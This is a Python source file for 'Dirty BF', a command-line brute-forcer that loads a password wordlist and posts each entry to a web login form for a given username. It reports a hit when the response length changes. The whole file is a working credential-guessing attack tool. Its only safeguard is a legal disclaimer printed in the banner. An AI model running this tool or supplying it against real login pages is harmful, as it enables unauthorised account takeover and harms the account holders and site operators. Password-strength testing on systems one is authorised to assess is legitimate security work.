#!/usr/bin/env python3
import requests
import argparse
import sys


random_user_agent = False


def main():
    #Vars
    url      = ""
    username = ""
    wordlist = ""
    ufield   = "username"
    pfield   = "password"
    
    
    banner()
    
    parser = argparse.ArgumentParser(description=("CLI Bruteforcer for login fields."))
    
    parser.add_argument('-u', '--url', 
                        nargs='?',
                        help="Set url to bruteforce (needed)",
                        required=True)
    parser.add_argument('-w', '--wordlist',
                        nargs='?',
                        help="Path to wordlist (needed)",
                        required=True)
    parser.add_argument('--username',
                        nargs='?',
                        help="Username to bruteforce (needed)",
                        required=True)
    
    parser.add_argument('--ufield',
                        nargs='?',
                        help="Username field if different than 'username'",
                        required=False)
    parser.add_argument('--pfield',
                        nargs='?',
                        help="Password field if different than 'password'",
                        required=False)
    
    args = parser.parse_args()
    print(args)
    args = vars(args)
    print(args)
    
    url = args["url"]
    wordlist = args["wordlist"]
    username = args["username"]
    
    pfield = args["pfield"] if args["pfield"] != None else pfield
    ufield = args["ufield"] if args["ufield"] != None else ufield
    
    wlist = read_wordlist(wordlist)
    
    bruteforce(url, username, wlist, ufield, pfield)
    

def banner():
    print(
"""
(                                (     
 )\ )              )          (   )\ )  
(()/(  (   (    ( /( (      ( )\ (()/(  
 /(_)) )\  )(   )\()))\ )   )((_) /(_)) 
(_))_ ((_)(()\ (_))/(()/(  ((_)_ (_))_| 
 |   \ (_) ((_)| |_  )(_))  | _ )| |_   
 | |) || || '_||  _|| || |  | _ \| __|  
 |___/ |_||_|   \__| \_, |  |___/|_|    
                     |__/              """)
    print("Welcome to Dirty BF")
    print("[!] legal disclaimer: Usage of dirtybf for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n")

def read_wordlist(wordlist: str):
    wlist = []
    try:
        with open(wordlist, 'r') as wl: # we try opening the file using UTF-8
            for line in wl:
                wlist.append(line.strip())
    except UnicodeDecodeError:
        try:
            if len(wlist) != 0:
                wlist = [] #we make sure the wordlist is empty
            with open(wordlist, 'r', encoding="ISO-8859-1") as wl: #Rockyou is not encoded with UTF-8.
                for line in wl:
                    wlist.append(line.strip())
        except:
            print("Problem in file encoding")
            raise UnicodeDecodeError
    return wlist

def test_url(url, data):
    status_codes = [200, 301, 302]
    r = requests.post(url, data=data)
    if r.status_code in status_codes:
        return True
    return False

def calculate_length(url, data):
    r = requests.post(url, data=data)
    return len(r.text)
    
def bruteforce(url, username, wlist: list, ufield, pfield, headers=None):
    if headers == None:
        headers = {
            "User-agent": "Dirty"
        }
    
    data = {
        ufield: username,
        pfield: "placeholder" 
    }
    
    idx = 0
    if test_url(url, data):
        default_len = calculate_length(url, data)
        for word in wlist:
            data[pfield] = word
            r = requests.post(url, data=data, headers=headers)
            if len(r.text) != default_len:
                print(f"[~] PASSWORD FOUND : {word}")
                break
        print("[~] Done")
    else:
        print("[~] URL can't be bruteforced.")
        
if __name__ == '__main__':
    main()